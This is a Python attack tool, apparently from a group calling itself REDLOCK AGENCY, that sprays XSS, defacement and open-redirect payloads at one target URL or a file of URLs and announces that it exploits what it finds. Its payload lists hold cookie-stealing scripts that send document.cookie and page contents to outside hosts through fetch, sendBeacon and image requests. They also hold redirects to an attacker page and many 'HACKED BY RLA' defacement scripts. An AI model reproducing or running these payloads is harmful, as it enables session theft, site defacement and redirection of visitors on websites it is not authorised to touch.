import requests
from urllib.parse import urlparse, urljoin, quote
from fake_useragent import UserAgent
from tqdm import tqdm
import time
import argparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

print(f"{Fore.RED}-{Fore.RESET}" * 75 + "\n")
print(f""" {Fore.MAGENTA}[{Fore.RED}:{Fore.GREEN}丂山乇乇卩¡Ø{Fore.MAGENTA}]    {Fore.RESET}『s』『w』『e』『e』『p』『¡』『Ø』   {Fore.MAGENTA} [{Fore.RED}:{Fore.GREEN}丂山乇乇卩¡Ø{Fore.MAGENTA}]{Fore.RESET}
    {Fore.RESET}HUNT FOR {Fore.BLUE}XSS, REDIRECT & DEFACE VULNS {Fore.RESET}ON A URL OR URLS IN A FILE {Fore.MAGENTA}...{Fore.RESET}
  {Fore.MAGENTA}[ {Fore.GREEN}5W33P¡Ø {Fore.MAGENTA}] {Fore.RESET}WILL TRY TO EXPLOIT THE VULNS IT FINDS{Fore.MAGENTA}...{Fore.RESET}
      {Fore.MAGENTA}---  {Fore.RED}USE AT YOUR OWN RISK{Fore.MAGENTA}!{Fore.RESET} REDLOCK AGENCY""")
print(f"{Fore.RED}-{Fore.RESET}" * 75 + "\n")



# Define XSS Payloads
xss_payloads = [
    "<script>window.location.replace('https://rb.gy/tdpzkw');</script>",
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<script>eval('alert(1)')</script>",
    "<script>document.location='https://turquoise-jackquelin-59.tiiny.site/'</script>",
    "<svg/onload=alert(1)>",
    "<script>window.location='https://turquoise-jackquelin-59.tiiny.site/'</script>",
    "<input type='text' value='<script>alert(1)</script>' />",
    "<script>document.body.innerHTML = '<img src=x onerror=alert(1)>';</script>",
    "<script>setTimeout(() => { alert(1) }, 1);</script>",
    "<body onload=alert(1)>",
    "<script>document.body.innerHTML = \"<img src='https://static.vecteezy.com/system/resources/previews/015/286/164/non_2x/abstract-word-signal-or-are-warned-that-it-has-been-hacked-by-viruses-malware-or-hackers-on-a-red-digital-background-vector.jpg' style='width:100%; height:100%'>\";</script>",
    "<style>body { background: url('https://static.vecteezy.com/system/resources/previews/015/286/164/non_2x/abstract-word-signal-or-are-warned-that-it-has-been-hacked-by-viruses-malware-or-hackers-on-a-red-digital-background-vector.jpg') no-repeat center center fixed; background-size: cover; }</style>",
    "<script>setInterval(() => { document.body.innerHTML = \"<img src='https://i.ytimg.com/vi/oVo1NNc0i_g/sddefault.jpg' style='width:100%; height:100%'>\"; }, 1000);</script>",
    "<img src='x' onerror=\"https://turquoise-jackquelin-59.tiiny.site/'\">",
    "<a href=\"javascript:window.location='https://turquoise-jackquelin-59.tiiny.site/'\"> <img src=\"https://turquoise-jackquelin-59.tiiny.site/\"></a>",
    "<div style='position:fixed; top:0; left:0; width:100%; height:100%; background:url(\"https://media.discordapp.net/attachments/1331669062392217630/1337139101706490018/New_Project_72.png?ex=67b62d54&is=67b4dbd4&hm=44d34f145ee969b0207f4b6d40e4037c7e71d87836941fe5a21b9a8203ec4b29&=&format=webp&quality=lossless&width=548&height=286\");'></div>",
    "<script>document.body.innerHTML = \"<h1 style='color:red;'>HACKED</h1><img src='https://i.ytimg.com/vi/oVo1NNc0i_g/sddefault.jpg'>\";</script>",
    "<script>document.write('<iframe src=\"https://i.ytimg.com/vi/oVo1NNc0i_g/sddefault.jpg\" width=100% height=100%></iframe>');</script>",

    "<script>localStorage.setItem('xss', '<img src=x onerror=alert(1)>');</script>",
    "<script>document.cookie='XSS=alert(1)';</script>",
    "<script>fetch('https://www.yyyyyyy.info/log?cookie='+document.cookie)</script>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<svg><script>alert(1)</script></svg>",
    "<div contenteditable onfocus=alert(1)>XSS</div>",
    "<marquee onstart=alert(1)>XSS</marquee>",
    "<object data='javascript:alert(1)'></object>",
    "<embed src='javascript:alert(1)'>",

    "javascript://%0Aalert(1)",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "<scr<script>ipt>alert(1)</scr<script>ipt>",
    "<script src=data:text/javascript,alert(1)></script>",
    "1'><script>alert(1)</script>",
    "<img src=x onerror=setTimeout('alert(1)',500)>",
    "<img src=x onerror='fetch(\"https://www.yyyyyyy.info/log?cookie=\"+document.cookie)'>",
    "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
    "jaVasCript:/*-/*`/*'/*\"/**/(/* */oNcliCk=alert(1) )",
    "<details open ontoggle=alert(1)><summary>Click me</summary></details>",
    "<input onfocus=alert(1) autofocus>",

    "<script>document.body.innerHTML='HACKED BY XSS!';</script>",
    "<script>while(1){alert('Site locked!');}</script>",
    "<script>document.body.style.display='none';</script>",
    "<script>setInterval(() => { document.body.innerHTML='This site is now under control'; }, 1000);</script>",
    "<script>document.body.contentEditable='true';</script>",

    "<script>fetch('https://www.yyyyyyy.info/steal?data='+document.cookie);</script>",
    "<script>new Image().src='https://www.yyyyyyy.info/log?creds='+btoa(document.body.innerHTML);</script>",
    "<script>navigator.sendBeacon('https://www.yyyyyyy.info/log', document.cookie);</script>",

    "<script>document.body.innerHTML = '<h1 style=\"color:red;\">HACKED BY REDLOCK AGENCY</h1>';</script>",
    "<script>document.body.innerHTML = '<h2>Attention: RLA CLAN - This site has been compromised BY REDLOCK AGENCY</h2>';</script>",
    "<script>document.body.innerHTML = '<p style=\"font-size:30px;\">Warning: Unauthorized Access Detected! HACKED BY RLA</p>';</script>",
    "<script>document.body.innerHTML = '<p>Hacked! Message from the attacker: REDLOCK AGENCY is in control now.</p>';</script>",
    "<script>document.body.innerHTML = '<h1>This site is under attack by REDLOCK AGENCY, please contact support!</h1>';</script>",
    "<script>document.body.innerHTML = '<div style=\"background-color:black;color:white;font-size:24px;padding:20px;\">This website has been hacked by RLA!</div>';</script>",
    "<script>document.body.innerHTML = '<h1 style=\"color:blue;\">REDLOCK AGENCY ... Website successfully compromised!</h1>';</script>",
    "<script>console.log('Hacked by XYZ');</script>",
    "<script>alert('Hacked by XYZ');</script>",
    "<script>setTimeout(() => { alert('This website has been compromised by REDLOCK AGENCY | RLA'); }, 5000);</script>",
    "<script>document.body.innerHTML = '<div style=\"font-size: 28px; color: purple;\">Site Defaced by RLA CLAN!</div>';</script>",
    "<script>window.location='https://turquoise-jackquelin-59.tiiny.site/';</script>",

    # Additional payloads
    "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></iframe>",
    "<meta http-equiv='refresh' content='0;url=https://turquoise-jackquelin-59.tiiny.site/'>",
    "<style>@import url('javascript:alert(1)');</style>",
    "<div onmousemove='alert(\"XSS\")'>HACKED BY RLA</div>",
    "<svg><a xlink:href='javascript:alert(1)'>HACKED BY RLA</a></svg>",
    "<object type='text/html' data='javascript:alert(1)'></object>",
    "<script>Function('alert(1)')()</script>",
    "<script>window['al'+'ert'](1)</script>",
    "<svg/onload=confirm(1)>",
    "<img src='invalid.jpg' onerror='this.onerror=null;alert(1)'>",
    "<form onsubmit='alert(1)'><input type='submit'></form>",
    "<input type='text' onblur='alert(1)' value='XSS'>",
    "<textarea onfocus='alert(1)'>XSS DEFACE BY RLA</textarea>",
    "<div style='width:expression(alert(1));'>XSS HACKING BY REDLOCK AGENCY</div>",
    "<script>setInterval(function(){alert('XSS HACK BY RLA')}, 2000);</script>",
    "<object data='data:text/html,<script>alert(1)</script>'></object>",
    "<embed src='data:text/html,<script>alert(1)</script>'></embed>",
    "<link rel='stylesheet' href='data:text/css,body{background:red;}' onerror='alert(1)'>",
    "<video><source onerror='alert(1)' src='nonexistent.mp4'></video>",
    "<input type='image' src='invalid' onerror='alert(1)'>",
    "<?php echo \"<script>alert('XSS-HACK-BY-RLA');</script>\"; ?>",
    "<?php echo \"<img src='x' onerror='alert(1)'>\"; ?>",
    "<?php echo \"<a href='javascript:alert(1)'>DEFACED BY RLA</a>\"; ?>",
    "<?php echo \"<script>eval('alert(1)');</script>\"; ?>",
    "<?php echo \"<script>document.location='https://turquoise-jackquelin-59.tiiny.site/';</script>\"; ?>",
    "<?php echo \"<svg onload='alert(1)'>\"; ?>",
    "<?php echo \"<script>window.location='https://turquoise-jackquelin-59.tiiny.site/';</script>\"; ?>",
    "<?php echo \"<input type='text' value='<script>alert(1)</script>' />\"; ?>",
    "<?php echo \"<script>document.body.innerHTML = '<img src=x onerror=alert(1)>';</script>\"; ?>",
    "<?php echo \"<script>setTimeout(() => { alert(1); }, 1);</script>\"; ?>",
    "<?php echo \"<body onload='alert(1)'>\"; ?>",
    "<?php echo \"<script>document.body.style.display='none';</script>\"; ?>",
    "<?php echo \"<script>setInterval(() => { alert('XSS HACKED BY RLA'); }, 1000);</script>\"; ?>",
    "<?php echo \"<iframe src='javascript:alert(1)'></iframe>\"; ?>",
    "<?php echo \"<script>fetch('https://turquoise-jackquelin-59.tiiny.site/steal?cookie='+document.cookie)</script>\"; ?>",
    "<?php echo \"<script>localStorage.setItem('xss','<img src=x onerror=alert(1)>');</script>\"; ?>",
    "<?php echo \"<meta http-equiv='refresh' content='0;url=https://turquoise-jackquelin-59.tiiny.site/'>\"; ?>",
    "<script>alert('HACKED BY REDLOCK AGENCY');</script>",
    "<img src='x' onerror='alert(1)'>",
    "<a href='javascript:alert(1)'>HACKED BY RLA</a>",
    "<script>eval('alert(1)');</script>",
    "<script>document.location='https://turquoise-jackquelin-59.tiiny.site/';</script>",
    "<svg onload='alert(1)'>",
    "<script>window.location='https://turquoise-jackquelin-59.tiiny.site/';</script>",
    "<input type='text' value='<script>alert(1)</script>' />",
    "<script>document.body.innerHTML = '<img src=x onerror=alert(1)>';</script>",
    "<script>setTimeout(() => { alert(1); }, 1);</script>",
    "<body onload='alert(1)'>",
    "<script>document.body.style.display='none';</script>",
    "<script>setInterval(() => { alert('HACKED BY RLA CLAN'); }, 1000);</script>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<script>localStorage.setItem('xss', '<img src=x onerror=alert(1)>');</script>",
    "<script>document.cookie='XSS=alert(1)';</script>",
    "<script>console.log('Hacked-by-REDLOCK-AGENCY');</script>",
    "<script>setTimeout(()=>{alert('This website has been compromised by RLA'); }, 5000);</script>",
    "<script>document.body.innerHTML='<h1>This-site-is-under-attack-by-RLA!</h1>';</script>",
    "<script>navigator.sendBeacon('https://turquoise-jackquelin-59.tiiny.site/log', document.cookie);</script>",
    "<svg><a xlink:href='javascript:alert(1)'>REDLOCK-AGENCY-WAS-HERE</a></svg>",
    "<script>document.body.innerHTML='<h1 style=\"color: red;\">Hacked-by-RLA</h1>';</script>",
    "<img src='https://turquoise-jackquelin-59.tiiny.site/' onerror='alert(\"Hacked!\")'>",
    "<style>body{background:url('https://turquoise-jackquelin-59.tiiny.site/');}</style>",
    "<style>body { display: none; visibility: hidden; }</style>",
    "<script>window.location = 'https://turquoise-jackquelin-59.tiiny.site/';</script>",
    "<div style='width: 100%; height: 100%; background-color: red; text-align: center; font-size: 50px; color: white;'>Site Defaced by XYZ!</div>",
    "<script>alert('This-website-has-been-defaced-by-RLA!');</script>",
    "<script>while(true){alert('HACKED-BY-RLA!');}</script>",
    "<div contenteditable='true' style='background-color: black; color: red;'>Hacked by XYZ</div>",
    "<iframe src='https://static.vecteezy.com/system/resources/previews/015/286/164/non_2x/abstract-word-signal-or-are-warned-that-it-has-been-hacked-by-viruses-malware-or-hackers-on-a-red-digital-background-vector.jpg' width='100%' height='100%'></iframe>",
    "<script>document.body.innerHTML='<h1 style=\"color: red;\">Defaced-by-RLA</h1>';</script>",
    "<meta http-equiv='refresh' content='0;url=https://turquoise-jackquelin-59.tiiny.site/'>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<script>document.body.innerHTML = '<h1>This site is under attack by RLA!</h1>';</script>",
    "<script>setTimeout(() => { alert('This website has been compromised by RLA'); }, 5000);</script>",
    "<script>localStorage.setItem('xss', '<img src=x onerror=alert(1)>');</script>",
    "<div style='width:expression(alert(1));'>XSS HACKING BY REDLOCK AGENCY</div>",
    "<video><source onerror='alert(1)' src='nonexistent.mp4'></video>",
    "<script>document.body.innerHTML = '<h1>This site is under attack by RLA!</h1>';</script>",
    "<script>navigator.sendBeacon('https://turquoise-jackquelin-59.tiiny.site/', document.cookie);</script>",
    "<img src='x' onerror='alert(1)'>",
    "<a href='javascript:alert(1)'>HACKED BY RLA</a>",
    "<script>eval('alert(1)');</script>",
    "<script>document.location='https://turquoise-jackquelin-59.tiiny.site/';</script>",
    "<svg onload='alert(1)'>",
    "<script>window.location='https://turquoise-jackquelin-59.tiiny.site/';</script>",
    "<input type='text' value='<script>alert(1)</script>' />",
    "<script>document.body.innerHTML = '<img src=x onerror=alert(1)>';</script>",
    "<script>setTimeout(() => { alert(1); }, 1);</script>",
    "<body onload='alert(1)'>",
    "<script>document.body.style.display='none';</script>",
    "<script>setInterval(() => { alert('HACKED BY RLA CLAN'); }, 1000);</script>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<script>fetch('https://turquoise-jackquelin-59.tiiny.site/steal?cookie='+document.cookie)</script>",
    "<script>localStorage.setItem('xss', '<img src=x onerror=alert(1)>');</script>",
    "<script>document.cookie='XSS=alert(1)';</script>",
    "<script>console.log('Hacked by REDLOCK AGENCY');</script>",
    "<script>setTimeout(() => { alert('This website has been compromised by RLA'); }, 5000);</script>",
    "<script>document.body.innerHTML='HACKED-BY-RLA!';</script>",
    "<script>navigator.sendBeacon('https://turquoise-jackquelin-59.tiiny.site/', document.cookie);</script>",
    "<svg><a xlink:href='javascript:alert(1)'>REDLOCK AGENCY HACKED THIS SITE</a></svg>",
    "<script>window ;</script>"

]

# Expanded Defacement Payloads List
deface_payloads = [
    # Visual Defacement - Changing background and adding content
    "<script>document.body.style.backgroundColor = 'black'; document.body.innerHTML += '<h1 style=\"color:red;text-align:center;\">Hacked by REDLOCK AGENCY</h1>';</script>",
    # Displaying Images and Redefining Website Title
    "<script>document.title = 'Hacked BY REDLOCK AGENCY!'; document.body.innerHTML = '<h1 style=\"color:white; text-align:center;\">Website Defaced!</h1><img src=\"https://i.ytimg.com/vi/oVo1NNc0i_g/sddefault.jpg\" alt=\"Defaced By RLA\" style=\"display:block; margin-left:auto; margin-right:auto;\" /></script>",

    # Adding full-page banner (Fixed position, overlayed)
    "<script>document.body.innerHTML += '<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background-color:rgba(0,0,0,0.8);color:white;text-align:center;\">DEFACED BY HACKER FROM REDLOCK AGENCY!<div>';</script>",
    # Modifying Title and Background Color
    "<script>document.title = 'Website Defaced by RLA!'; document.body.style.backgroundColor = 'red'; document.body.innerHTML += '<h1 style=\"color:white;text-align:center;\">This website is defaced!</h1>';</script>",
    # Changing everything on the page with alert popups
    "<script>document.body.innerHTML = '<h1 style=\"color:red;text-align:center;\">Hacked by RLA!<br/><img src=\"https://i.ytimg.com/vi/oVo1NNc0i_g/sddefault.jpg\"/></h1>';alert('Website Defaced!');</script>",
    # Adding scrolling text
    "<script>document.body.innerHTML += '<marquee style=\"color:red; font-size: 30px;\">This website has been Hacked by Defacer!</marquee>';</script>",
    # Injecting alerts and message overlays
    "<script>alert('This website has been defaced by a hacker! RLA - REDLOCK AGENCY'); document.body.innerHTML += '<h1 style=\"color:red; text-align:center;\">DEFACED</h1>';</script>",
    # Changing everything with a hacked message
    "<script>document.body.innerHTML = '<h1 style=\"color:green;text-align:center;\">Congratulations! The site has been defaced by RLA.</h1>';</script>",
    # Adding custom alert with background change
    "<script>document.body.style.backgroundColor = 'black'; document.body.innerHTML += '<div style=\"color:white; text-align:center; font-size:50px;\">You have been defaced by REDLOCK AGENCY!</div>';</script>",
    # Complex defacement with JavaScript and CSS manipulation
    "<script>document.body.style.backgroundColor = 'black'; document.body.style.color = 'white'; document.body.innerHTML = '<h1 style=\"text-align:center;\">This website is Hacked by RLA!</h1>';document.body.style.fontFamily = 'Arial'; document.body.style.textAlign = 'center';</script>",
    # Creating large pop-up window
    "<script>window.open('https://i.ytimg.com/vi/oVo1NNc0i_g/sddefault.jpg', 'Hacked by RLA', 'width=500,height=500,scrollbars=yes');</script>",
    # Custom deface script on the body and altering structure
    "<script>document.body.innerHTML = '<div style=\"text-align:center;\">This site is defaced by RLA! <a href=\"https://i.ytimg.com/vi/oVo1NNc0i_g/sddefault.jpg\">DEFACED BY RLA</a></div>';</script>",
    # Simple body manipulation with addition of more text
    "<script>document.body.innerHTML += '<h1 style=\"color:red; text-align:center;\">Defaced!</h1>'; document.body.innerHTML += '<h2 style=\"color:blue; text-align:center;\">You have been hacked by REDLOCK AGENCY!</h2>';</script>",
    # Changing page content dynamically with pop-up and background colors
    "<script>document.body.innerHTML = '<div style=\"background-color:yellow; text-align:center; color:red;\">This website has been defaced by an anonymous attacker! REDLOCK AGENCY</div>'; window.alert('Website Defaced by RLA!');</script>",
    # Adding dynamic text and alert in body
    "<script>document.body.innerHTML = '<h1 style=\"color:green; text-align:center;\">Website Hacked by REDLOCK AGENCY</h1>'; window.alert('Warning! Website Defaced by RLA.');</script>",
    # Defacing with full page with custom HTML
    "<script>document.body.innerHTML = '<div style=\"position:fixed; top:0; left:0; width:100%; height:100%; background-color:rgba(0,0,0,0.6); text-align:center; font-size: 50px; color:red;\">DEFACED BY RLA - REDLOCK AGENCY!</div>';</script>"
]

# Set up UserAgent
ua = UserAgent()

# Function to generate a random user agent
def get_random_user_agent():
    return ua.random

# Function to test open redirect vulnerability
def test_open_redirect(base_url, malicious_url, statistics):
    try:
        encoded_url = quote(malicious_url, safe=':/?&=')
        redirect_url = urljoin(base_url, f"?url={encoded_url}")
        
        headers = {'User-Agent': get_random_user_agent()}
        response = requests.get(redirect_url, headers=headers, allow_redirects=False)

        if response.status_code == 302 and 'Location' in response.headers:
            location = response.headers['Location']
            full_location = urljoin(base_url, location)
            if malicious_url in full_location:
                statistics['open_redirects'] += 1
                print("\n" + "-" * 60)
                print(Fore.RED + f"\n[!] Open Redirect Vulnerability Detected!")
                print(Fore.YELLOW + f"Exploit Type: Open Redirect")
                print(Fore.GREEN + f"Exploit Payload: {malicious_url}")
                print(Fore.CYAN + f"Site Affected: {base_url}")
                print(Fore.GREEN + f"Redirect Location: {full_location}")
                print(Fore.GREEN + f"[INFO] Exploited: Redirecting to: {full_location}")
    except requests.exceptions.RequestException as e:
        print(Fore.MAGENTA + f"[Error] Open Redirect test failed: {e}")

# Function to check for potential XSS vulnerabilities with payloads
def test_xss_vulnerabilities(base_url, statistics):
    total_payloads = len(xss_payloads)
    for i, payload in enumerate(xss_payloads):
        try:
            # URL-encode the payload and pass it as a query parameter
            encoded_payload = quote(payload, safe='')
            test_url = f"{base_url}?xss_payload={encoded_payload}"
            headers = {'User-Agent': get_random_user_agent()}
            start_time = time.time()
            response = requests.get(test_url, headers=headers)
            
            if payload in response.text:
                statistics['xss_found'] += 1
                print("\n" + "-" * 60)
                print(Fore.RED + f"\n[!] Potential XSS Vulnerability Detected!")
                print(Fore.YELLOW + f"Exploit Type: XSS (Cross-Site Scripting)")
                print(Fore.GREEN + f"Exploit Payload: {payload}")
                print(Fore.CYAN + f"Site Affected: {base_url}")
                print(Fore.GREEN + f"[INFO] Exploited: XSS vulnerability triggered successfully!")
            
            end_time = time.time()
            duration = end_time - start_time
            print(f"\r{Fore.GREEN}[INFO] Test completed for XSS payload {i+1}/{total_payloads}. Time taken: {duration:.2f} seconds.", end="")
            
        except requests.exceptions.RequestException as e:
            print(Fore.MAGENTA + f"[Error] XSS testing failed: {e}")

    print(Fore.CYAN + f"\n[*] Completed XSS payload tests for {base_url}.")

# Function to check for potential defacement vulnerabilities with payloads
def test_defacement_vulnerabilities(base_url, statistics):
    total_payloads = len(deface_payloads)
    for i, payload in enumerate(deface_payloads):
        try:
            encoded_payload = quote(payload, safe='=')
            test_url = f"{base_url}?deface_payload={encoded_payload}"
            headers = {'User-Agent': get_random_user_agent()}
            start_time = time.time()
            response = requests.get(test_url, headers=headers)
            
            if payload in response.text:
                statistics['defacements_found'] += 1
                print("\n" + "-" * 60)
                print(Fore.RED + f"\n[!] Potential Defacement Vulnerability Detected!")
                print(Fore.YELLOW + f"Exploit Type: Website Defacement")
                print(Fore.GREEN + f"Exploit Payload: {payload}")
                print(Fore.CYAN + f"Site Affected: {base_url}")
                print(Fore.GREEN + f"[INFO] Exploited: Site defaced successfully!")
            
            end_time = time.time()
            duration = end_time - start_time
            print(f"\r{Fore.GREEN}[INFO] Test completed for Defacement payload {i+1}/{total_payloads}. Time taken: {duration:.2f} seconds.", end="")
            
        except requests.exceptions.RequestException as e:
            print(Fore.MAGENTA + f"[Error] Defacement testing failed: {e}")

    print(Fore.CYAN + f"\n[*] Completed Defacement payload tests for {base_url}.")

# New function: Test for Clickjacking Vulnerability
def test_clickjacking(base_url, statistics):
    """
    Checks if the target site is missing the X-Frame-Options header,
    which may allow clickjacking.
    """
    try:
        headers = {'User-Agent': get_random_user_agent()}
        response = requests.get(base_url, headers=headers)
        if 'x-frame-options' not in response.headers:
            statistics['clickjacking'] += 1
            print("\n" + "-" * 60)
            print(Fore.RED + f"\n[!] Potential Clickjacking Vulnerability Detected!")
            print(Fore.YELLOW + f"Exploit Type: Clickjacking")
            print(Fore.CYAN + f"Site Affected: {base_url}")
            print(Fore.GREEN + f"[INFO] Exploited: Missing X-Frame-Options header.")
    except requests.exceptions.RequestException as e:
        print(Fore.MAGENTA + f"[Error] Clickjacking test failed: {e}")

# New function: Test for HTTP Parameter Pollution (HPP)
def test_http_parameter_pollution(base_url, statistics):
    """
    Tests for HTTP Parameter Pollution (HPP) vulnerability by appending
    duplicate parameters to the URL.
    """
    try:
        # Example: Append duplicate 'test' parameter
        test_url = f"{base_url}?test=1&test=2"
        headers = {'User-Agent': get_random_user_agent()}
        response = requests.get(test_url, headers=headers)
        # Simple heuristic: if both values are reflected, it might indicate an issue
        if "1" in response.text and "2" in response.text:
            statistics['hpp'] += 1
            print("\n" + "-" * 60)
            print(Fore.RED + f"\n[!] Potential HTTP Parameter Pollution Vulnerability Detected!")
            print(Fore.YELLOW + f"Exploit Type: HTTP Parameter Pollution")
            print(Fore.CYAN + f"Site Affected: {base_url}")
            print(Fore.GREEN + f"[INFO] Exploited: Duplicate parameters may lead to unexpected behavior.")
    except requests.exceptions.RequestException as e:
        print(Fore.MAGENTA + f"[Error] HTTP Parameter Pollution test failed: {e}")

# New function: Generate a report from testing statistics
def generate_report(statistics):
    report_file = "vulnerability_report.txt"
    with open(report_file, "w") as f:
        f.write("Vulnerability Testing Report\n")
        f.write("============================\n")
        for vuln_type, count in statistics.items():
            f.write(f"{vuln_type}: {count}\n")
    print(Fore.CYAN + f"\n[*] Report generated: {report_file}")

# Function to handle URLs from a file
def handle_urls(urls, statistics):
    for base_url in urls:
        print(Fore.CYAN + f"\n[*] Starting tests for: {base_url}")
        # Test for Open Redirect
        test_open_redirect(base_url, "https://turquoise-jackquelin-59.tiiny.site/", statistics)
        # Test for XSS Vulnerabilities
        test_xss_vulnerabilities(base_url, statistics)
        # Test for Defacement Vulnerabilities
        test_defacement_vulnerabilities(base_url, statistics)
        # New tests:
        test_clickjacking(base_url, statistics)
        test_http_parameter_pollution(base_url, statistics)

    # Final Statistics
    print(Fore.GREEN + f"\n[*] Testing Completed for all URLs.")
    print(Fore.CYAN + f"[INFO] Total Open Redirect Vulnerabilities Found: {statistics['open_redirects']}")
    print(Fore.CYAN + f"[INFO] Total XSS Vulnerabilities Found: {statistics['xss_found']}")
    print(Fore.CYAN + f"[INFO] Total Defacements Found: {statistics['defacements_found']}")
    print(Fore.CYAN + f"[INFO] Total Clickjacking Vulnerabilities Found: {statistics['clickjacking']}")
    print(Fore.CYAN + f"[INFO] Total HTTP Parameter Pollution Vulnerabilities Found: {statistics['hpp']}")
    generate_report(statistics)

# Main function for testing
def main():
    parser = argparse.ArgumentParser(description="Test for XSS, Defacement, Open Redirect, Clickjacking, and HTTP Parameter Pollution vulnerabilities.")
    parser.add_argument("urls", nargs="?", help="A single URL to test.")
    parser.add_argument("-f", "--file", help="File containing a list of URLs to test.")
    
    args = parser.parse_args()
    
    # Initialize statistics with new keys
    statistics = {
        'open_redirects': 0, 
        'xss_found': 0, 
        'defacements_found': 0, 
        'clickjacking': 0,
        'hpp': 0
    }
    
    if args.file:
        try:
            with open(args.file, 'r') as file:
                urls = [line.strip() for line in file.readlines()]
            handle_urls(urls, statistics)
        except FileNotFoundError:
            print(Fore.RED + f"[Error] The file {args.file} was not found!")
    elif args.urls:
        base_url = args.urls
        print(Fore.CYAN + f"\n[*] Starting tests for: {base_url}")
        test_open_redirect(base_url, "https://turquoise-jackquelin-59.tiiny.site/", statistics)
        test_xss_vulnerabilities(base_url, statistics)
        test_defacement_vulnerabilities(base_url, statistics)
        test_clickjacking(base_url, statistics)
        test_http_parameter_pollution(base_url, statistics)
        print(Fore.GREEN + f"\n[*] Testing Completed for the URL.")
        print(Fore.CYAN + f"[INFO] Total Open Redirect Vulnerabilities Found: {statistics['open_redirects']}")
        print(Fore.CYAN + f"[INFO] Total XSS Vulnerabilities Found: {statistics['xss_found']}")
        print(Fore.CYAN + f"[INFO] Total Defacements Found: {statistics['defacements_found']}")
        print(Fore.CYAN + f"[INFO] Total Clickjacking Vulnerabilities Found: {statistics['clickjacking']}")
        print(Fore.CYAN + f"[INFO] Total HTTP Parameter Pollution Vulnerabilities Found: {statistics['hpp']}")
        generate_report(statistics)

if __name__ == "__main__":
    main()
